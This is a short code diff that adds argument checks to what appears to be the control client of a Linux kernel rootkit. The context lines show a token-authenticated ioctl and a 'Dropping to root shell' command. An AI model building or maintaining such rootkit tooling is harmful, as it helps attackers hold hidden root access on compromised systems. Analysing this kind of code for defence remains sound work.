@@ -61,7 +61,14 @@ int main ( int argc, char *argv[] )
 
     io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
 
-    switch ( atoi(argv[1]) )
+    int cmd = atoi(argv[1]);
+    if (cmd >= 1 && cmd <= 12 && argc < 3) {
+        fprintf(stderr, "Error: command %d requires an argument\n", cmd);
+        close(sockfd);
+        return 1;
+    }
+
+    switch ( cmd )
     {
     case 0:
         printf("Dropping to root shell\n");
